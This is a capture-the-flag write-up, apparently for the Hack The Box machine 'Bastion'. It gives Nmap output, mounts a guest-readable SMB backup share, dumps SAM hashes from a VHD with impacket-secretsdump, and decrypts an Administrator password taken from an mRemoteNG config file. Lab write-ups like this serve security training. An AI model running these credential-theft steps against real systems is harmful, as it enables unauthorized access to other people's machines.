# Enum

### Namp Scap
```
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

5985/tcp  open     wsman
```


### Namp Detailed Scan
```
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m56s, deviation: 1h09m16s, median: 2s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-19T18:49:22+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-19T16:49:25
|_  start_date: 2021-07-19T08:47:05
```

***
### Smb-Shares

```
smbclient -L \\\\10.10.10.134\\
```

Avalible Shares:
- `ADMIN$`
- `Backups` ==> `Accessable`
- `C$`
- `IPC$`

In the Backups Folder found a `.vhd` file of a `L4mpje-PC`
***

mounted the `.vhd` backup file to access it  
- https://vk9-sec.com/mount-extract-password-hashes-from-vhd-files/
- https://medium.com/@abali6980/mounting-vhd-files-in-kali-linux-through-remote-share-smb-1c4d37c22211

```bash
mount -t cifs //10.10.10.134/Backups -o user=guest,password= /mnt/remote 
```


Used **Impacket** to Dump hashes
```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

***
# Footholding

Cracked hashed password for `L4mpje`

ssh into machine using those credentials
```cli
l4mpje@BASTION C:\Users\L4mpje\Desktop>more user.txt 
```

***
# Prev Esc

Found a Vuln program Installed  `mRemoteNG`

On Googling more about it found that its `Config.xml` contains hashed password which can be Cracked

```poweshell
C:\Users\L4mpje\AppData\Roaming\mRemoteNG>more confCons.xml
```

`Administrator` hashed Password Found from it

password cracked using https://github.com/kmahyyg/mremoteng-decrypt
